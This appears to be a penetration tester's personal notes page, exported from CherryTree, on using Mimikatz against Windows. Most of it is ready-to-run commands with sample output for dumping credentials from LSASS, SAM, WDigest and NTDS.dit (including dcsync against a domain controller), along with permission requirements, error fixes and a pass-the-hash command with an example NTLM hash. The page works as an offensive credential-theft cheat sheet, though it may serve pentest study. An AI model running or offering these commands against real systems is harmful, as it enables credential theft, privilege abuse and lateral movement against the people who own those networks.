<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Mimikatz</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Tools - Mimikatz</h1></strong><br />Mimikatz will dump credentials from LSASS memory.<br />From Windows 8.1 and Server 2012 R2 onwards, you won&#39;t find passwords in cleartext anymore.<br />It can also do a bunch of other Windows authentication magic with tickets in kerberos, etc.<br /><br /><strong>Links</strong><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md</a><br />• <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa">https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa</a><br />• <a href="https://book.hacktricks.xyz/windows/stealing-credentials/credentials-mimikatz">https://book.hacktricks.xyz/windows/stealing-credentials/credentials-mimikatz</a><br /><br />• Mimikatz offers x86 and x64 binaries - will have to transfer them to the target<br />• Can also use <code>Invoke-Mimikatz</code> powershell script.<br /><br /><strong><h2>## Permissions</h2></strong><br /><strong>MIMIKATZ MUST BE RUN AS ADMINISTRATOR OR SYSTEM</strong><br /><strong>SAFE PRACTISE TO JUST RUN </strong><strong><code>privilege::debug</code></strong><strong> AT START OF EVERY MIMIKATZ SESSION</strong><br /><br />To dump credentials from LSASS requires permissions:<br /><br />• Administrator? - Need <code>SeDebugPrivilege</code> - enable with <code>privilege::debug</code><br />• SYSTEM? - Doesn&#39;t need anything<br /><br />Without adequate permissions, all commands will fail with this error:<br /><code>ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)</code><br /><br /><strong><h2>## Running Mimikatz</h2></strong><br />Have 2 options:<br />• Execute 1 command<br />• Interactive session<br /><br /><strong>One command</strong><br /><div class="codebox"><div class="codebox">#&nbsp;Dump&nbsp;LSASS&nbsp;memory&nbsp;passwords&nbsp;and&nbsp;SAM&nbsp;passwords<br />.\mimikatz.exe&nbsp;&quot;privilege::debug&quot;&nbsp;&quot;sekurlsa::logonpasswords&quot;&nbsp;&quot;lsadump::sam&quot;&nbsp;&quot;exit&quot;</div></div><br /><br /><strong>Interactive Session</strong><br /><div class="codebox"><div class="codebox">#&nbsp;1.&nbsp;Start&nbsp;mimikatz&nbsp;binary<br />C:\Users\Public&gt;&nbsp;mimikatz.exe<br /><br />#&nbsp;2.&nbsp;Enable&nbsp;SeDebugPrivilege&nbsp;(usually&nbsp;just&nbsp;good&nbsp;to&nbsp;do&nbsp;even&nbsp;if&nbsp;running&nbsp;as&nbsp;SYSTEM)<br />mimikatz&nbsp;#&nbsp;privilege::debug<br />Privilege&nbsp;&#39;20&#39;&nbsp;OK<br /><br />#&nbsp;3.&nbsp;Enable&nbsp;logging&nbsp;if&nbsp;you&nbsp;want&nbsp;it<br />mimikatz&nbsp;#&nbsp;log&nbsp;sekurlsa.log<br />Using&nbsp;&#39;sekurlsa.log&#39;&nbsp;for&nbsp;logfile&nbsp;:&nbsp;OK</div></div><br /><br /><strong><h2>## Extract Passwords</h2></strong><br />From Windows 8.1 and Server 2012 R2 onwards, you won&#39;t find passwords in cleartext anymore.<br />Refer to other <em>Dumping Credentials</em> nodes for more specific info/commands.<br /><br />If getting:<br /><code>ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)</code><br />• Try enabling debug privileges - <code>privilege::debug</code><br />• LSA Protection might be enabled - <a href="Pentetration_Testing--Privilege_Escalation--Linux--Kernel_Exploits--full-nelson.html">try bypassing LSA protection</a><br /><br /><strong><h3>### Extract from SAM</h3></strong><br /><code>mimikatz # lsadump::sam</code><br /><br /><strong><h3>### Extract from LSASS memory</h3></strong><br /><code>mimikatz # sekurlsa::logonpasswords</code><br /><code>mimikatz # sekurlsa::logonpasswords full</code><br /><br /><strong><h3>### Extract from WDigest</h3></strong><br /><code>mimikatz # sekurlsa::wdigest</code><br /><br /><strong><h3>### Extract from NTDS.dit locally on Domain Controller</h3></strong><br /><strong>lsadump::lsa</strong><br />Ask LSA Server to retrieve SAM/AD enterprise<br /><code>lsadump::lsa /inject</code><br /><br /><strong><h3>### Extract from NTDS.dit on Remote Domain Controller</h3></strong><br /><strong>lsadump::dcsync</strong><br />• Utilises the Directory Replication Service (DRS) to retrieve the password hashes from the NTDS.DIT file<br />• Can be executed from any system that is part of the domain when run as Domain Admin<br />• REQUIRES DOMAIN ADMIN<br />• If no /domain specified, mimikatz will find a domain controller in the domain to connect to<br /><br /><code>mimikatz # lsadump::dcsync /domain:umbrella.local /all /csv</code><br /><br /><strong><h2>## Pass the Hash</h2></strong><br />It&#39;s possible to pass-the-hash with mimikatz.<br /><br /><strong>sekurlsa::pth</strong><br />• If no <code>/run</code> specified, runs cmd.exe by default (for shell)<br />• requires elevated privileges (<code>privilege::debug</code> or <code>SYSTEM</code> account)<br />• <code>AES</code> keys can be used only on 8.1/2012r2 onwards<br />   ◇ or on 7/2008r2/8/2012 with <code>kb2871997</code> installed<br /><br /><code>mimikatz # sekurlsa::pth /user:Administrator /domain:umbrella.local /ntlm:cc36cf7a8514893efccd332446158b1a /run:powershelle.exe</code><br /><br /><br /></div>
</body>
</html>
